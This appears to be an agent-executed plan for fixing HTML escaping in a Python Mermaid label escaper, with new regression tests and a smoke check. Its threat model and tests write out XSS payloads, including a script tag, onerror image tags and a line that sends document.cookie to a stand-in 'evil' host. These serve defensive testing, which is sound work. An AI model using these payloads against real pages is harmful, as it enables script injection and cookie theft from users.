---
phase: 03-design-validation
plan: 14
type: gap-closure
wave: 5
depends_on: [12]
files_modified:
  - src/token_world/viz/mermaid.py
  - tests/test_viz/test_mermaid_escape.py
autonomous: true
requirements:
  - DVAL-01
  - GRAPH-07
tags:
  - gap-closure
  - security
  - viz
  - mermaid

must_haves:
  truths:
    - "escape_label('<script>alert(1)</script>') does NOT contain the substring '<script' in the returned string"
    - "escape_label('multi\\nline') still contains the literal '<br/>' token (newline rendering preserved)"
    - "escape_label('<b>bold</b>') has all raw '<' / '>' replaced by '&lt;' / '&gt;' except for any literal '<br/>' that corresponds to an original newline in the input"
    - "Truncation invariant from M-01 still holds: no malformed '&...' or '<...' entity fragments at the cut boundary for any input including <> payloads"
    - "uv run pytest tests/test_viz/ -q passes all tests"
    - "uv run ruff check src/ tests/ still exits 0"
  artifacts:
    - path: "src/token_world/viz/mermaid.py"
      provides: "escape_label that HTML-entity-escapes all Mermaid-hostile chars including < and >, while re-introducing literal <br/> only for original newline positions"
      contains: "&lt;"
      contains_also: "&gt;"
    - path: "tests/test_viz/test_mermaid_escape.py"
      provides: "Adversarial regression tests for angle-bracket escaping"
      contains: "<script>alert(1)</script>"
  key_links:
    - from: "src/token_world/viz/mermaid.py:escape_label"
      to: "tests/test_viz/test_mermaid_escape.py"
      via: "adversarial parametrized test covering <script>, <img src=x>, raw <, raw >, and mixed <br/>+<script>"
      pattern: "&lt;script&gt;"
---

<objective>
Close UAT gap (Test 7, severity: major) — `src/token_world/viz/mermaid.py:escape_label` currently maps only `" \n [ ] |` and leaves raw `<` and `>` verbatim. An attacker-controlled node label containing `<script>alert(1)</script>` survives untouched; whether Mermaid renders it is a deployment-config coincidence (Mermaid `securityLevel`), not defense-in-depth.

The intended contract (documented in 03-04-SUMMARY.md and described in the UAT `missing` field) is: escape every Mermaid/HTML-hostile character, including `<` and `>`, and then re-insert the literal token `<br/>` *only* at the positions where the original input had a `\n`.

Purpose: Close the security gap so Phase 04 mechanic-generation pipelines can render any LLM-produced label without relying on a downstream sanitizer. Defense-in-depth at the point of production, not the point of consumption.

Output: An `escape_label` that satisfies both the adversarial payload test and the existing truncation-safety tests, plus a regression test encoding the new contract.
</objective>

<execution_context>
@$HOME/.claude/get-shit-done/workflows/execute-plan.md
@$HOME/.claude/get-shit-done/templates/summary.md
</execution_context>

<context>
@.planning/PROJECT.md
@.planning/phases/03-design-validation/03-UAT.md
@.planning/phases/03-design-validation/03-04-viz-graph-cli-PLAN.md
@src/token_world/viz/mermaid.py
@tests/test_viz/test_mermaid_escape.py
</context>

<threat_model>
**Asset protected:** Anyone who renders the Mermaid output emitted by `token-world viz-graph` — developers in their terminal, reviewers in rendered markdown, and future operator-agent sessions that surface graph snapshots inline. If the graph contains an attacker-controlled label (e.g. an LLM-generated entity name), we must not let it inject `<script>`, `<iframe>`, `<img onerror=...>`, or Mermaid subgraph/classDef syntax.

**STRIDE:**
- **Tampering / Elevation:** A label containing `<script>alert(1)</script>` could execute JavaScript in any Mermaid renderer that trusts HTML labels (default config of `@mermaid-js/mermaid` with `securityLevel: 'loose'` — exactly what many docs sites use).
- **Information disclosure:** A crafted `<img src=x onerror="fetch('//evil/'+document.cookie)">` label could exfiltrate cookies from pages that render our graph.

**Mitigation:** Entity-escape `<` → `&lt;` and `>` → `&gt;` at the escape boundary. Newlines become `<br/>` *after* the generic escape, not before, so genuine newline rendering survives but attacker `<br/>` tokens in the raw input are neutralised.

**Severity: HIGH** (major per UAT). Block on: high.
</threat_model>

<tasks>

<task id="14.1">
<title>Rewrite escape_label to entity-escape < and > while preserving intentional <br/> for newlines</title>

<read_first>
  - src/token_world/viz/mermaid.py (current `_ESCAPES` table and `escape_label` body)
  - tests/test_viz/test_mermaid_escape.py (existing contract, especially the truncation-safety test for M-01 which constrains how we handle unterminated entities)
</read_first>

<action>
Rewrite `src/token_world/viz/mermaid.py` so the escape order is:

1. Escape `<` → `&lt;` and `>` → `&gt;` FIRST (along with the existing `" [ ] |`).
2. Replace `\n` with the literal token `<br/>` AFTER the entity escape, so the `<br/>` is emitted as `<br/>` (unescaped) *only* because we introduce it ourselves, not because the input contained `<br/>`.

Concrete implementation (replace the current module body):

```python
"""Mermaid-safe label escaping."""

from __future__ import annotations

# Order matters: entity-escape all angle brackets and other hostile chars
# BEFORE we introduce our own literal '<br/>' for newlines. This prevents
# an attacker-supplied label like '<script>' from surviving the escape.
_ENTITY_ESCAPES = str.maketrans(
    {
        '"': "#quot;",
        "[": "&#91;",
        "]": "&#93;",
        "|": "&#124;",
        "<": "&lt;",
        ">": "&gt;",
    }
)

_NEWLINE_TOKEN = "<br/>"


def escape_label(text: str, *, max_len: int = 60) -> str:
    """Escape characters that break Mermaid flowchart labels.

    Steps:
      1. Entity-escape `" [ ] | < >` so attacker-controlled HTML/Mermaid
         syntax in `text` cannot survive.
      2. Replace each `\\n` with the literal token `<br/>` — this is the
         ONLY `<br/>` that appears in output; any `<br/>` in the input has
         already been escaped to `&lt;br/&gt;` in step 1.
      3. Truncate to `max_len`, walking the cut backwards off any
         incomplete `&...;` entity or `<...>` tag so the result never
         contains a malformed fragment (M-01 invariant).
    """
    escaped = text.translate(_ENTITY_ESCAPES).replace("\n", _NEWLINE_TOKEN)
    if len(escaped) > max_len:
        cut = max_len - 1
        prefix = escaped[:cut]
        amp = prefix.rfind("&")
        lt = prefix.rfind("<")
        opener = max(amp, lt)
        if opener != -1:
            closer_char = ";" if opener == amp else ">"
            if closer_char not in escaped[opener:cut]:
                cut = opener
        escaped = escaped[:cut] + "…"
    return escaped
```

Key correctness notes for the executor:
- `translate(_ENTITY_ESCAPES)` does the angle-bracket escape in ONE pass, so we do not have the classic double-escape bug where `<` → `&lt;` and then `&lt;` → `&amp;lt;`.
- The `.replace("\n", "<br/>")` runs on the already-entity-escaped string, so `\n` is still present (entity-escape doesn't touch it), and the `<br/>` we introduce is the *only* `<br/>` in the output.
- The truncation logic is unchanged — same rfind('&') / rfind('<') / closer walk.
</action>

<acceptance_criteria>
  - `src/token_world/viz/mermaid.py` contains the literal string `"<": "&lt;"` (or equivalent single-char mapping — a `grep "&lt;" src/token_world/viz/mermaid.py` returns at least 1 hit)
  - `src/token_world/viz/mermaid.py` contains the literal string `"&gt;"`
  - `src/token_world/viz/mermaid.py` contains the literal string `.replace("\n", "<br/>")` or equivalent ordering comment
  - `python -c "from token_world.viz import escape_label; out = escape_label('<script>alert(1)</script>'); assert '<script' not in out, repr(out); print('OK')"` prints `OK` and exits 0
  - `python -c "from token_world.viz import escape_label; out = escape_label('a\\nb'); assert '<br/>' in out, repr(out); print('OK')"` prints `OK` and exits 0
  - `python -c "from token_world.viz import escape_label; out = escape_label('<br/>evil'); assert '<br/>evil' not in out and '&lt;br/&gt;' in out, repr(out); print('OK')"` prints `OK` and exits 0
  - `uv run ruff format --check src/token_world/viz/mermaid.py` exits 0
  - `uv run mypy src/token_world/viz/` exits 0
</acceptance_criteria>

</task>

<task id="14.2">
<title>Add adversarial test coverage for the angle-bracket escape contract</title>

<read_first>
  - tests/test_viz/test_mermaid_escape.py (existing parametrized style — match it)
  - src/token_world/viz/mermaid.py (post-task-14.1 state)
</read_first>

<action>
Extend `tests/test_viz/test_mermaid_escape.py` with three new tests. Do not remove or weaken any existing test (especially `test_truncation_never_produces_malformed_entity` — that is the M-01 regression guard).

Append these to the end of the file:

```python
@pytest.mark.parametrize(
    "payload",
    [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<iframe src=//evil></iframe>",
        "<b>bold</b>",
        "a < b and c > d",
    ],
)
def test_escape_neutralises_angle_brackets(payload: str) -> None:
    """UAT #7 regression: raw < and > must be entity-escaped.

    The only <...> token permitted in the output is the literal <br/>
    inserted BY escape_label in response to a real newline in the input.
    """
    out = escape_label(payload, max_len=200)
    assert "<script" not in out, f"raw <script survived: {out!r}"
    assert "<img" not in out, f"raw <img survived: {out!r}"
    assert "<iframe" not in out, f"raw <iframe survived: {out!r}"
    assert "<b>" not in out, f"raw <b> survived: {out!r}"
    # No raw < > at all (except any <br/> which we assert separately)
    residue = out.replace("<br/>", "")
    assert "<" not in residue, f"raw '<' survived: {out!r}"
    assert ">" not in residue, f"raw '>' survived: {out!r}"


def test_escape_preserves_newline_as_br() -> None:
    """Newlines in input → literal <br/> in output (the ONE legal <> token)."""
    out = escape_label("line1\nline2", max_len=100)
    assert "<br/>" in out
    # The <br/> is the only < in the output
    assert out.count("<") == 1
    assert out.count(">") == 1


def test_attacker_supplied_br_is_escaped() -> None:
    """A <br/> token already present in the input must be neutralised;
    only our injected <br/> (from real \\n) is legal."""
    out = escape_label("safe<br/>attacker", max_len=100)
    # Attacker's <br/> must be entity-escaped — no literal <br/> at all
    # (since input had no \n, escape_label did not inject one).
    assert "<br/>" not in out, f"attacker <br/> survived: {out!r}"
    assert "&lt;br/&gt;" in out
```

These tests cover: XSS-shaped payloads, mixed-content, standalone `<` `>`, legitimate newline rendering, and the subtle case where the attacker tries to forge the `<br/>` token.
</action>

<acceptance_criteria>
  - `tests/test_viz/test_mermaid_escape.py` contains the literal string `<script>alert(1)</script>`
  - `tests/test_viz/test_mermaid_escape.py` contains a test named `test_escape_neutralises_angle_brackets`
  - `tests/test_viz/test_mermaid_escape.py` contains a test named `test_escape_preserves_newline_as_br`
  - `tests/test_viz/test_mermaid_escape.py` contains a test named `test_attacker_supplied_br_is_escaped`
  - `uv run pytest tests/test_viz/test_mermaid_escape.py -v` reports at least 3 new tests passing, AND all pre-existing tests still pass (including the M-01 `test_truncation_never_produces_malformed_entity` parametrized cases)
  - `uv run pytest tests/ -q` exits 0 with increased test count vs. prior run
</acceptance_criteria>

</task>

<task id="14.3">
<title>Verify viz-graph CLI output still parses as valid Mermaid after the escape change</title>

<read_first>
  - src/token_world/viz/graph_viz.py (the CLI that consumes escape_label)
  - scripts/uat_phase_03.py (the check_viz_graph_cli harness — observe what it asserts)
</read_first>

<action>
Run the existing UAT harness end-to-end to confirm the escape tightening did not break well-formed Mermaid emission on a realistic graph:

```bash
uv run token-world create gap-uat-14
# Seed a universe with a label containing <>
uv run python -c "
from pathlib import Path
from token_world.graph import KnowledgeGraph
kg = KnowledgeGraph(db_path=Path('universes/gap-uat-14/universe.db'))
kg.add_node('alice', node_type='agent', name='alice <the brave>')
kg.add_node('room_a', node_type='entity')
kg.add_edge('alice', 'room_a', relation='located_in')
kg.save()
"
uv run token-world viz-graph gap-uat-14 --node alice --depth 2 > /tmp/viz_gap_14.mmd
grep -q 'flowchart LR' /tmp/viz_gap_14.mmd
# alice's label must be entity-escaped in the output
grep -q 'alice &lt;the brave&gt;' /tmp/viz_gap_14.mmd || grep -q '&lt;' /tmp/viz_gap_14.mmd
# No raw '<the' should appear
! grep -q '<the' /tmp/viz_gap_14.mmd
uv run token-world delete gap-uat-14 --force 2>/dev/null || rm -rf universes/gap-uat-14
```

This is a smoke check; make it a task rather than an acceptance_criteria item so it is visibly executed during `gsd-execute-phase`.
</action>

<acceptance_criteria>
  - `/tmp/viz_gap_14.mmd` (or equivalent output) contains the literal string `flowchart LR`
  - The output contains at least one `&lt;` token (proof that the CLI pipeline actually uses escape_label on labels)
  - The output does NOT contain the substring `<the` (proof the raw attacker-shape label was neutralised)
  - The universe cleanup step leaves `universes/gap-uat-14/` removed (or: the test uses a tmpdir and cleanup is automatic)
</acceptance_criteria>

</task>

</tasks>

<verification>
  - `uv run pytest tests/test_viz/ -q` → all tests pass, ≥3 more tests than before
  - `uv run pytest tests/ -q` → 291+3 = 294 tests pass (approximately — exact count depends on whether task 14.3 adds a test vs. a shell smoke check)
  - Manual adversarial probe: `python -c "from token_world.viz import escape_label; print(repr(escape_label('<script>alert(1)</script>')))"` prints a string with `&lt;script&gt;` (no `<script`)
  - Re-run UAT Test 7 probe — flips from `issue` to `pass`
  - `uv run ruff check src/ tests/` exits 0
  - `uv run mypy src/token_world/viz/` exits 0
</verification>
